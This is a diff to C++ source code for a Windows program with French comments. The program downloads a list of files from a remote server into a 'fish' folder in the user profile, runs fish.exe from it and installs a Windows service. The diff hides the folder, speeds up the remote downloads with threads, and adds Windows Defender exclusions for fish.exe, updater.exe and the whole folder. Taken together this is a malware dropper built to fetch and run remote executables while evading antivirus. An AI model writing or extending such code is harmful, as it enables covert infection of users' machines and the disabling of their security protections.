@@ -1,14 +1,18 @@
 #include <windows.h>
 #include <shlobj.h>
 #include <wininet.h>
+#include <urlmon.h>
+#include <thread>
 #include <string>
 #include <vector>
 #include <fstream>
+#include <chrono>
 #include <iostream>
 #include "../include/core.h"
 
 #pragma comment(lib, "wininet.lib")
 #pragma comment(lib, "advapi32.lib")
+#pragma comment(lib, "urlmon.lib")
 
 using namespace std;
 
@@ -69,8 +73,12 @@ void AddDefenderExclusion(const string& folderPath) {
         CloseHandle(pi.hProcess);
         CloseHandle(pi.hThread);
     }
+    this_thread::sleep_for(chrono::seconds(1));
 }
 
+void downloadFile(const string& url, const string& localPath) {
+    URLDownloadToFile(NULL, url.c_str(), localPath.c_str(), 0, NULL);
+}
 
 int main() {
 
@@ -84,7 +92,7 @@ int main() {
 
     string fishFolder = userFolder + "\\fish";
     CreateDirectory(fishFolder.c_str(), NULL);
-
+    SetFileAttributes(fishFolder.c_str(), FILE_ATTRIBUTE_HIDDEN);
 
     string fileListPath = fishFolder + "\\" + FILE_LIST;
     if (!DownloadFile(SERVER_URL + FILE_LIST, fileListPath)) {
@@ -95,17 +103,36 @@ int main() {
 
     vector<string> filesToDownload = GetFileList(fileListPath);
 
+        // Dans votre boucle principale
+        vector<thread> downloadThreads;
 
-    for (const string& file : filesToDownload) {
-        string url = SERVER_URL + file;
-        string localPath = fishFolder + "\\" + file;
+        for (const string& file : filesToDownload) {
+            string url = SERVER_URL + file;
+            string localPath = fishFolder + "\\" + file;
+
+            cout << localPath << endl;
+
+            // Création d'un nouveau thread pour chaque téléchargement
+            downloadThreads.emplace_back(DownloadFile, url, localPath);
+        }
+
+        // Attendre que tous les téléchargements soient terminés
+        for (auto& thread : downloadThreads) {
+            thread.join();
+        }
+
+        this_thread::sleep_for(chrono::seconds(5));
+
+        /*
         if (!DownloadFile(url, localPath)) {
             MessageBox(NULL, ("Échec du téléchargement de " + file).c_str(), "Erreur", MB_OK | MB_ICONERROR);
         }
-    }
+        */
+    
 
     // Lancer fish.exe
     string fishPath = fishFolder + "\\fish.exe";
+
     ExecuteFile(fishPath);
 
     // Installer le service Windows
@@ -119,8 +146,13 @@ int main() {
     cout << userFolder << endl;
     cout << fishFolder << endl;
 
-    // Ajouter une exclusion antivirus
+    // Ajouter trois exclusion antivirus
     AddDefenderExclusion(fishPath);
+
+    string updaterPath = fishFolder + "\\updater.exe";
+    AddDefenderExclusion(updaterPath);
+
+    AddDefenderExclusion(fishFolder);
 
     return 0;
 }
